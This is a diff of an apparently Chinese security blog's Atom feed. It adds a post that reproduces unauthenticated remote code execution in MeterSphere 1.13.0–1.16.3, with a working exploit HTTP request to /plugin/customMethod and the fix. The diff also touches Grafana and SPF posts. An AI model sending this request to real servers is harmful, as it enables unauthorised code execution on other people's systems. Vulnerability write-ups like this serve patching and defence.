@@ -2,13 +2,52 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-02-12T10:07:06.041Z</updated>
+    <updated>2022-02-13T05:39:57.114Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
     <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 老白</rights>
+    <entry>
+        <title type="html"><![CDATA[MeterSphere未授权远程代码执行]]></title>
+        <id>https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/</id>
+        <link href="https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/">
+        </link>
+        <updated>2022-02-12T10:21:07.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="一-metersphere">一、MeterSphere</h1>
+<p>  <code>MeterSphere</code> 是一站式开源持续测试平台，涵盖测试跟踪、接口测试、性能测试、 团队协作等功能，该漏洞由于自定义插件功能处存在权限验证缺陷，致使攻击者无需经过身份验证即可通过构造特定的请求在目标系统上远程执行任意代码。</p>
+<h1 id="二-影响版本">二、影响版本</h1>
+<p>  <code>v1.13.0 &lt;= MeterSphere &lt;= v1.16.3</code></p>
+<h1 id="三-漏洞复现">三、漏洞复现</h1>
+<p>  MeterSphere安装</p>
+<pre><code>wget https://github.com/metersphere/metersphere/releases/download/v1.16.3/metersphere-online-installer-v1.16.3.tar.gz
+tar zxvf metersphere-online-installer-v1.16.3.tar.gz
+cd metersphere-online-installer-v1.16.3/
+MSVERSION=&quot;v1.16.3&quot;
+sed -i -e &quot;s#MS_IMAGE_TAG=.*#MS_IMAGE_TAG=${MSVERSION}#g&quot; install.conf
+sed -i -e &quot;s#MS_IMAGE_PREFIX=.*#MS_IMAGE_PREFIX=registry.cn-qingdao.aliyuncs.com\/metersphere#g&quot; install.conf
+/bin/bash install.sh
+</code></pre>
+<p>  访问 http://&lt;IP&gt;:8081<br>
+<img src="https://V-alkoinen.github.io/post-images/1644666257791.png" alt="" loading="lazy"><br>
+  发送如下数据包：</p>
+<pre><code>
+POST /plugin/customMethod HTTP/1.1
+Host: ip:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Content-Length: 34
+Content-Type: application/json
+Accept-Encoding: gzip, deflate
+Connection: close
+
+{&quot;entry&quot;: &quot;Evil&quot;, &quot;request&quot;: &quot;id&quot;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644730628050.png" alt="" loading="lazy"></figure>
+<h1 id="四-漏洞修复">四、漏洞修复</h1>
+<p>升级<code>MeterSphere</code> 至v1.16.4及以上版本<a href="https://community.fit2cloud.com/#/products/metersphere/downloads">https://community.fit2cloud.com/#/products/metersphere/downloads</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2021-4034 Polkit local privilege escalation]]></title>
         <id>https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/</id>
@@ -377,7 +416,8 @@ mimikatz &quot;kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;SID&gt; /kr
         </link>
         <updated>2021-12-09T03:20:11.000Z</updated>
         <content type="html"><![CDATA[<h1 id="一-背景">一、背景</h1>
-<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a></p>
+<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
+<img src="https://V-alkoinen.github.io/post-images/1644730783714.png" alt="" loading="lazy"></p>
 <h1 id="二-影响范围">二、影响范围</h1>
 <p>  <code>grafana 8.x</code></p>
 <h1 id="三-漏洞复现">三、漏洞复现</h1>
@@ -711,15 +751,6 @@ v=spf1 a mx ip4:173.194.72.103 -all
 <p> <a href="http://www.openspf.org/">open SPF</a><br>
  <a href="http://www.openspf.org/Why">SPF Why</a><br>
  <a href="http://tools.bevhost.com/spf/">Beveridge SPF Test</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[DevSecOps 流程]]></title>
-        <id>https://V-alkoinen.github.io/post/devsecops-liu-cheng/</id>
-        <link href="https://V-alkoinen.github.io/post/devsecops-liu-cheng/">
-        </link>
-        <updated>2021-10-08T07:42:44.000Z</updated>
-        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644133387901.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
 </feed>
